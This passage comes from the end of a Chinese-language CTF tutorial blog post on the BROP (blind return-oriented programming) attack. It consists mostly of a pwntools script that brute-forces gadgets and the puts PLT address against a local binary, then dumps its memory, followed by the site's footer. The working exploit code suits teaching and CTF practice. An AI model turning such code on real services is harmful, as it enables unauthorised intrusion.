class="keyword">return</span> based_addr</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            based_addr+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">buff,address</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Checking:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(address)))</span><br><span class="line">        p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(address)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">10</span></span><br><span class="line">        p.send(payload)</span><br><span class="line">        string=p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">123</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;no game&#x27;</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="comment">#exit with code 0</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;WelCome&#x27;</span> <span class="keyword">in</span> string:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#return main function</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_brop_gadget</span>(<span class="params">buff,stop_gadget</span>):</span><br><span class="line">    based_addr=<span class="number">0x4007a0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Function recved: &quot;</span>+<span class="built_in">str</span>(buff)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(stop_gadget)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========Get Brop gadget==========&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try:&quot;</span>+<span class="built_in">hex</span>(based_addr))</span><br><span class="line">            p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(based_addr)+p64(<span class="number">0xdeadbeef</span>)*<span class="number">6</span>+p64(stop_gadget)</span><br><span class="line">            p.send(payload)</span><br><span class="line">            string = p.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> string.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">                p.close()</span><br><span class="line">                based_addr+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(string)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Possible Address: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(based_addr)))</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="keyword">if</span> check(buff,based_addr):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;check success!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> based_addr</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;check failed!&quot;</span>)</span><br><span class="line">                based_addr+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            based_addr+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_puts_plt</span>(<span class="params">buff,stop_gadget,pop_rdi</span>):</span><br><span class="line">    based_addr=<span class="number">0x400560</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Function recved:&quot;</span>+<span class="built_in">str</span>(buff)+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(stop_gadget))+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(pop_rdi)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=========Get Puts plt==========&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Try:&quot;</span>+<span class="built_in">hex</span>(based_addr))</span><br><span class="line">            p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(pop_rdi)+p64(<span class="number">0x400000</span>)+p64(based_addr)+p64(stop_gadget)</span><br><span class="line">            p.send(payload)</span><br><span class="line">            string = p.recv()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;\x7fELF&#x27;</span> <span class="keyword">in</span> string:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Puts PLT:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(based_addr)))</span><br><span class="line">                <span class="keyword">return</span> based_addr</span><br><span class="line">            based_addr+=<span class="number">1</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            based_addr+=<span class="number">1</span></span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_dump</span>(<span class="params">buff,stop_gadget,pop_rdi,puts_plt,leak_addr</span>):</span><br><span class="line">    <span class="keyword">try</span>:    </span><br><span class="line">        p=process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*buff+p64(pop_rdi)+p64(leak_addr)+p64(puts_plt)+p64(stop_gadget)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        data = p.recvuntil(<span class="string">b&#x27;\nWelCome my friend&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">            data = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_program</span>(<span class="params">buff_lenth,stop_gadget,pop_rdi,puts_plt,leak_addr</span>): </span><br><span class="line">    dumped = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> leak_addr&lt;<span class="number">0x401000</span>:</span><br><span class="line">        data=data_dump(buff_lenth,stop_gadget,pop_rdi,puts_plt,leak_addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;dumped:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(leak_addr)))</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            dumped+=data</span><br><span class="line">        leak_addr+=<span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./code&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(dumped)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    buff_lenth = get_overflow_len()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Size:&quot;</span>+<span class="built_in">str</span>(buff_lenth))</span><br><span class="line">    stop_gadget = find_stop_gadget(buff_lenth)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;StopGadget:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(stop_gadget)))</span><br><span class="line">    brop_gadget = find_brop_gadget(<span class="number">72</span>,<span class="number">0x4005d0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BropGadget:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(brop_gadget)))</span><br><span class="line">    pop_rdi=brop_gadget+<span class="number">9</span></span><br><span class="line">    puts_plt=find_puts_plt(buff_lenth,stop_gadget,pop_rdi)</span><br><span class="line">    leak_addr=<span class="number">0x400000</span></span><br><span class="line">    <span class="comment">#Dump All</span></span><br><span class="line">    leak_program(buff_lenth,stop_gadget,pop_rdi,puts_plt,leak_addr)</span><br></pre></td></tr></table></figure>
+<p>接下来就不写了，就是普通的栈溢出问题，鉴于实战环境是远端机，所以我们还需要找到对应的libc版本。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text"> 相关概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text"> 攻击条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%A2%84%E8%A7%88"><span class="toc-number">4.</span> <span class="toc-text"> 攻击预览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dump%E5%86%85%E5%AD%98"><span class="toc-number">5.</span> <span class="toc-text"> Dump内存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#canary%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text"> Canary防护绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEstop-gadget"><span class="toc-number">5.2.</span> <span class="toc-text"> 寻找stop gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E5%88%A9%E7%94%A8gadget"><span class="toc-number">5.3.</span> <span class="toc-text"> 寻找可利用gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dump%E5%86%85%E5%AD%98-2"><span class="toc-number">5.4.</span> <span class="toc-text"> dump内存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text"> 实行攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ending"><span class="toc-number">7.</span> <span class="toc-text"> Ending</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#update-20221227"><span class="toc-number">8.</span> <span class="toc-text"> Update: 2022&#x2F;12&#x2F;27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hctf2016-brop"><span class="toc-number">9.</span> <span class="toc-text"> HCTF2016 brop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#service"><span class="toc-number">9.1.</span> <span class="toc-text"> service</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">9.2.</span> <span class="toc-text"> checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#source"><span class="toc-number">9.3.</span> <span class="toc-text"> Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">9.4.</span> <span class="toc-text"> Exploit</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/12/25/pwn-BROP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/12/25/pwn-BROP/&text=pwn-BROP concept and example"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/12/25/pwn-BROP/&is_video=false&description=pwn-BROP concept and example"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn-BROP concept and example&body=Check out this article: http://example.com/2022/12/25/pwn-BROP/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/12/25/pwn-BROP/&title=pwn-BROP concept and example"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/12/25/pwn-BROP/&name=pwn-BROP concept and example&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/12/25/pwn-BROP/&t=pwn-BROP concept and example"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
